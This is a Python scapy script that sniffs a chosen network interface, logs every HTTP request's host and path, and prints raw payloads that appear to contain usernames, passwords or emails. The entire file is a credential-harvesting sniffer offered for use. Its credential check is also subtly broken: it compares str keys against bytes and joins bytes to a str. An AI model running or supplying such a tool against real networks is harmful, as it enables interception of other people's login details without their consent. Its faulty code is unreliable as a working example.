import scapy.all as scapy
import argparse
from scapy.layers import http

def get_interface():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i","--interface",dest="interface",help="specify interface on which to sniff packets",required=True)
    arguments = parser.parse_args()
    return arguments.interface

def sniff(iface):
    try:
        print(f"[*] Starting sniffing on interface {iface}")
        scapy.sniff(iface=iface, store=False, prn=process_packet)
    except Exception as e:
        print(f"[!] Error opening adapter: {e}")

def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        host = packet[http.HTTPRequest].Host.decode() if isinstance(packet[http.HTTPRequest].Host, bytes) else packet[http.HTTPRequest].Host
        path = packet[http.HTTPRequest].Path.decode() if isinstance(packet[http.HTTPRequest].Path, bytes) else packet[http.HTTPRequest].Path
        print("[+] HTTP Request >>" + host + path)
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keys = ["username", "password","pass","email"]
            for key in keys:
                if key in load:
                    print("[+] possible password/username >>"+ load)
                    break

iface = get_interface()
sniff(iface)